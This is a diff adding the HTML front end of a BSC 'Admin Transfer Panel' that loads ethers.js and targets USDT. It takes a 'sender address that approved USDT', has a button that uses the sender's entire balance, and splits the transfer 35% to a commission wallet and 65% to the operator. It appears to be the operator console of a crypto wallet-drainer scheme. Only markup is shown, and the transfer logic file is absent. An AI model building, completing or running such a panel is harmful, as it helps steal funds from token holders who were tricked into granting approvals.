@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>0X Admin — Transfer Panel</title>
+  <meta name="description" content="0X Admin Panel for authorized BEP20 token operations on BSC.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⬡</text></svg>">
+</head>
+<body>
+  <!-- Animated background -->
+  <div class="bg-grid"></div>
+  <div class="bg-glow g1"></div>
+  <div class="bg-glow g2"></div>
+  <div class="bg-glow g3"></div>
+  <div class="bg-noise"></div>
+
+  <div class="app">
+    <!-- Header -->
+    <header class="header" id="header">
+      <div class="header-left">
+        <div class="logo">
+          <div class="logo-hex">⬡</div>
+          <div>
+            <span class="logo-title">0X</span>
+            <span class="logo-sub">Admin</span>
+          </div>
+        </div>
+      </div>
+      <div class="header-right">
+        <div class="network-badge" id="networkBadge">
+          <span class="net-dot"></span>
+          <span id="networkName">BSC Mainnet</span>
+        </div>
+        <button class="btn-connect" id="connectBtn" onclick="handleConnect()">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          <span id="connectText">Connect Wallet</span>
+        </button>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main">
+
+      <!-- Stats Bar -->
+      <div class="stats-bar" id="statsBar" style="display:none">
+        <div class="stat-item">
+          <span class="stat-label">Wallet</span>
+          <span class="stat-value mono" id="statWallet">—</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-label">BNB Balance</span>
+          <span class="stat-value" id="statBNB">—</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-label">Contract</span>
+          <span class="stat-value mono" id="statContract">—</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-label">Status</span>
+          <span class="stat-value" id="statAuth">—</span>
+        </div>
+      </div>
+
+      <!-- Transfer Card -->
+      <div class="card transfer-card" id="transferCard">
+        <div class="card-header">
+          <div class="card-icon">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 1l4 4-4 4"/><path d="M3 11V9a4 4 0 0 1 4-4h14"/><path d="M7 23l-4-4 4-4"/><path d="M21 13v2a4 4 0 0 1-4 4H3"/></svg>
+          </div>
+          <div>
+            <h1 class="card-title">Execute Transfer</h1>
+            <p class="card-subtitle">func4 — Authorized token transfer with 35% commission split</p>
+          </div>
+        </div>
+
+        <div class="card-body">
+          <!-- Token (auto-set) -->
+          <div class="field">
+            <div class="field-label-row">
+              <label class="field-label">Token</label>
+              <span class="field-badge">Auto • BEP20</span>
+            </div>
+            <div class="token-display">
+              <div class="token-icon">
+                <img src="https://assets.coingecko.com/coins/images/325/small/Tether.png" alt="USDT" width="24" height="24" onerror="this.style.display='none'">
+              </div>
+              <div class="token-info">
+                <span class="token-name">Tether USD</span>
+                <span class="token-addr mono">0x55d398326f99059fF775485246999027B3197955</span>
+              </div>
+              <span class="token-symbol">USDT</span>
+            </div>
+          </div>
+
+          <!-- Sender Address -->
+          <div class="field">
+            <div class="field-label-row">
+              <label class="field-label" for="senderAddr">Sender Address</label>
+              <button class="field-action" onclick="pasteSender()" title="Paste from clipboard">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>
+                Paste
+              </button>
+            </div>
+            <input type="text" id="senderAddr" class="input" placeholder="0x... (address that approved USDT)" autocomplete="off" spellcheck="false">
+            <div class="field-hint" id="senderHint"></div>
+          </div>
+
+          <!-- Amount -->
+          <div class="field">
+            <div class="field-label-row">
+              <label class="field-label" for="amount">Amount (USDT)</label>
+              <button class="field-action" id="maxBtn" onclick="setMaxAmount()" title="Use sender's full USDT balance" style="display:none">
+                MAX
+              </button>
+            </div>
+            <div class="input-wrapper">
+              <input type="text" id="amount" class="input input-amount" placeholder="0.00" autocomplete="off" oninput="updatePreview()">
+              <span class="input-suffix">USDT</span>
+            </div>
+            <div class="field-hint" id="amountHint"></div>
+          </div>
+
+          <!-- Split Preview -->
+          <div class="split-preview" id="splitPreview" style="display:none">
+            <div class="split-title">Commission Split</div>
+            <div class="split-row">
+              <span class="split-label">Commission Wallet (35%)</span>
+              <span class="split-value" id="splitComm">0.00 USDT</span>
+            </div>
+            <div class="split-row">
+              <span class="split-label">Your Share (65%)</span>
+              <span class="split-value highlight" id="splitYou">0.00 USDT</span>
+            </div>
+            <div class="split-divider"></div>
+            <div class="split-row total">
+              <span class="split-label">Total</span>
+              <span class="split-value" id="splitTotal">0.00 USDT</span>
+            </div>
+          </div>
+
+          <!-- Execute Button -->
+          <button class="btn-execute" id="execBtn" onclick="executeTransfer()" disabled>
+            <span id="execText">Connect Wallet to Continue</span>
+            <div class="btn-loader" id="execLoader" style="display:none">
+              <div class="spinner"></div>
+            </div>
+          </button>
+        </div>
+      </div>
+
+      <!-- Transaction History -->
+      <div class="card history-card" id="historyCard" style="display:none">
+        <div class="card-header small">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12,6 12,12 16,14"/></svg>
+          <h2 class="card-title small">Recent Transactions</h2>
+        </div>
+        <div class="history-list" id="historyList"></div>
+      </div>
+
+    </main>
+  </div>
+
+  <!-- Toast Container -->
+  <div class="toast-wrap" id="toastWrap"></div>
+
+  <!-- Success Overlay -->
+  <div class="success-overlay" id="successOverlay">
+    <div class="success-content">
+      <div class="success-icon">✓</div>
+      <h2>Transaction Successful</h2>
+      <p id="successMsg"></p>
+      <a id="successLink" href="#" target="_blank" class="success-link">View on BscScan →</a>
+      <button class="btn-close-success" onclick="closeSuccess()">Close</button>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
